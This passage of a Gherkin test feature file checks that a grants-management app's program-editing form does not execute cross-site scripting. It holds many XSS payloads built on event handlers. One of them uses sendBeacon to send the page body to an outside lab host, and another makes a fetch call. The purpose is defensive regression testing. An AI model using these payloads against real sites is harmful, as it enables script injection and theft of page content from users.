      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300725 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                          | Field                |
      | <details ontoggle=alert(1) open>test</details> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300726 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                        | Field                |
      | <style>:target {color: red;}</style><xss id=x style="transition:color 10s" ontransitioncancel=print()></xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300728 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                              | Field                |
      | <xss id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300729 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                       | Field                |
      | <style>:target {transform: rotate(180deg);}</style><xss id=x style="transition:transform 2s" ontransitionrun=print()></xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300736 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                      | Field                |
      | <style>:target {color:red;}</style><xss id=x style="transition:color 1s" ontransitionstart=alert(1)></xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300740 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                               | Field                |
      | <body onunhandledrejection=alert(1)><script>fetch('//xyz')</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300743 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                               | Field                |
      | <body onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300745 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                             | Field                |
      | <style>@keyframes x{}</style><xss style="animation-name:x" onwebkitanimationend="alert(1)"></xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300746 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                  | Field                |
      | <style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"></xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300747 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                               | Field                |
      | <style>@keyframes x{}</style><xss style="animation-name:x" onwebkitanimationstart="alert(1)"></xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300749 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                          | Field                |
      | <style>:target {color:red;}</style><xss id=x style="transition:color 1s" onwebkittransitionend=alert(1)></xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300755 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                        | Field                |
      | <body onafterprint=alert(1)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300756 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                       | Field                |
      | <input onauxclick=alert(1)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300757 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                               | Field                |
      | <a onbeforecopy="alert(1)" contenteditable>test</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300760 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                              | Field                |
      | <a onbeforecut="alert(1)" contenteditable>test</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300761 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                            | Field                |
      | <xss contenteditable onbeforeinput=alert(1)>test | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300762 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                    | Field                |
